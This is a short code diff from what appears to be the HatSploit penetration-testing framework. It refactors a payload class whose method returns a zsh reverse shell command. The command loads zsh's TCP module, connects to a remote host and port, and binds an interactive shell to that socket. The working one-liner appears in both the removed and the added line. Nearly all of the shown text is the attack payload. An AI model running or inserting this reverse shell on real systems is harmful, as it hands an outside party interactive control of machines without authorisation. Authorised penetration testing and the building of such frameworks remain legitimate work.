@@ -27,5 +27,4 @@ class HatSploitPayload(Payload):
         remote_host = self.handler['RHOST']
         remote_port = self.handler['RPORT']
 
-        payload = f"zsh -c 'zmodload zsh/net/tcp && ztcp {remote_host} {remote_port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
-        return payload
+        return f"zsh -c 'zmodload zsh/net/tcp && ztcp {remote_host} {remote_port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
